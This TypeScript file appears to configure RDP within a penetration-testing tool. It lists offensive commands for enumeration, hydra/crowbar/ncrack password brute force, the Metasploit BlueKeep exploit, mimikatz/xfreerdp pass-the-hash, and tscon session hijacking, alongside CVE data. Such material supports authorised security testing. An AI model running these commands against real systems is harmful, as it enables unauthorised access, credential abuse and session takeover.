/**
 * RDP Service Configuration
 * Remote Desktop Protocol
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const rdpConfig: ServiceConfig = {
  id: 'rdp',
  name: 'RDP (Remote Desktop Protocol)',
  description: 'RDP - проприетарный протокол Microsoft для удаленного рабочего стола. Позволяет удаленно управлять Windows-системами. Часто атакуется через brute force, BlueKeep и другие уязвимости.',
  categoryId: 'remote-access',
  version: '1.0.0',
  tags: ['remote-access', 'windows', 'graphical', 'remote-desktop'],

  matchers: {
    serviceNames: ['ms-wbt-server', 'rdp', 'msrdp', 'Microsoft Terminal Services'],
    cpePatterns: ['cpe:/a:microsoft:remote_desktop', 'cpe:/a:microsoft:terminal_services'],
    bannerRegex: [
      'Remote Desktop Protocol',
      'Terminal Server',
      '\\x03\\x00\\x00.*\\x0b\\x00',
      'mstshash',
    ],
    productPatterns: ['Microsoft Terminal Services', 'Remote Desktop', 'Windows Terminal'],
    standardPorts: [3389, 3390, 33389],
    nseScriptMatchers: [
      { scriptName: 'rdp-enum-encryption', outputPattern: '.' },
      { scriptName: 'rdp-ntlm-info', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 30,

  techniques: [
    {
      id: 'rdp-enum',
      name: 'RDP Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о RDP-сервере: версия, уровень шифрования, поддерживаемые протоколы аутентификации.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>', description: 'RDP enumeration' },
        { tool: 'rdpscan', command: 'rdpscan <target>', description: 'Быстрое сканирование RDP' },
        { tool: 'hydra', command: 'hydra -L users.txt -P passwords.txt rdp://<target>', description: 'RDP brute force' },
      ],
      nseScripts: [
        { name: 'rdp-enum-encryption', description: 'Определение уровня шифрования', safe: true },
        { name: 'rdp-ntlm-info', description: 'Получение NTLM информации', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'rdp-bruteforce',
      name: 'RDP Brute Force',
      mitreId: 'T1110',
      description: 'Подбор учетных данных для RDP-доступа. Один из самых распространенных векторов атак на Windows.',
      commands: [
        { tool: 'hydra', command: 'hydra -L users.txt -P passwords.txt rdp://<target> -t 1', description: 'RDP brute force (медленно)' },
        { tool: 'crowbar', command: 'crowbar -b rdp -s <target>/32 -U users.txt -C passwords.txt', description: 'Crowbar RDP brute force' },
        { tool: 'ncrack', command: 'ncrack -p 3389 -U users.txt -P passwords.txt <target>', description: 'Ncrack RDP brute force' },
      ],
      difficulty: 'easy',
      prerequisites: ['Список пользователей', 'Словарь паролей'],
      tags: ['bruteforce', 'authentication', 'windows'],
    },
    {
      id: 'rdp-vulnerabilities',
      name: 'RDP Vulnerabilities',
      description: 'Эксплуатация критических уязвимостей RDP: BlueKeep, BlueGate и других.',
      cves: [
        { cveId: 'CVE-2019-0708', cvss: 9.8, description: 'BlueKeep - RDP RCE wormable', exploitAvailable: true },
        { cveId: 'CVE-2020-0610', cvss: 8.1, description: 'BlueGate - RDS Gateway RCE', exploitAvailable: true },
        { cveId: 'CVE-2020-0611', cvss: 8.1, description: 'BlueGate variant', exploitAvailable: true },
      ],
      commands: [
        { tool: 'nmap', command: 'nmap -p 3389 --script rdp-vuln-ms12-020 <target>', description: 'Check RDP vulns' },
        { tool: 'metasploit', command: 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce', description: 'BlueKeep exploit' },
        { tool: 'rdpscan', command: 'rdpscan --vulnerable <target>', description: 'BlueKeep vulnerability scan' },
      ],
      nseScripts: [
        { name: 'rdp-vuln-ms12-020', description: 'Проверка MS12-020', safe: true },
      ],
      difficulty: 'hard',
      tags: ['vulnerability', 'rce', 'critical'],
    },
    {
      id: 'rdp-pass-the-hash',
      name: 'Pass-the-Hash RDP',
      mitreId: 'T1550.002',
      description: 'Restricted Admin mode позволяет RDP-подключение с NTLM-хэшем вместо пароля.',
      commands: [
        { tool: 'xfreerdp', command: 'xfreerdp /u:user /d:domain /pth:NTHASH /v:target', description: 'PtH RDP connection' },
        { tool: 'mimikatz', command: 'sekurlsa::pth /user:user /domain:domain /ntlm:hash /run:"mstsc /v:target"', description: 'Mimikatz PtH RDP' },
      ],
      difficulty: 'medium',
      prerequisites: ['NTLM хэш пользователя', 'Restricted Admin mode включен'],
      tags: ['pass-the-hash', 'lateral-movement', 'post-exploitation'],
    },
    {
      id: 'rdp-hijack',
      name: 'RDP Session Hijacking',
      mitreId: 'T1563.002',
      description: 'Перехват активных RDP-сессий других пользователей на скомпрометированной системе.',
      commands: [
        { tool: 'query', command: 'query user', description: 'Просмотр активных сессий' },
        { tool: 'tscon', command: 'tscon <session_id> /dest:<my_session>', description: 'Hijack RDP session' },
        { tool: 'sc', command: 'sc create sesshijack binpath= "cmd.exe /k tscon <id> /dest:<my_id>"', description: 'Service-based hijack' },
      ],
      difficulty: 'medium',
      prerequisites: ['SYSTEM привилегии', 'Активные сессии других пользователей'],
      tags: ['hijacking', 'post-exploitation', 'privilege-escalation'],
    },
  ],

  triggers: [
    {
      techniqueId: 'rdp-vulnerabilities',
      conditions: [
        { type: 'version', operator: 'regex', value: 'Windows (2000|XP|2003|2008|7)' },
        { type: 'nse_output', operator: 'contains', value: 'VULNERABLE' },
      ],
    },
  ],

  ui: {
    icon: 'monitor',
    color: '#8b5cf6',
    displayPriority: 90,
  },

  references: [
    { title: 'RDP Penetration Testing', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp' },
    { title: 'BlueKeep Exploitation', url: 'https://www.rapid7.com/blog/post/2019/09/06/initial-analysis-of-the-bluekeep-rdp-vulnerability/' },
  ],

  notes: 'RDP часто доступен из Интернета и является популярным вектором атак. Проверяйте NLA (Network Level Authentication), уровень шифрования и Known Vulnerabilities. BlueKeep работает только на старых системах.',
};

export default rdpConfig;
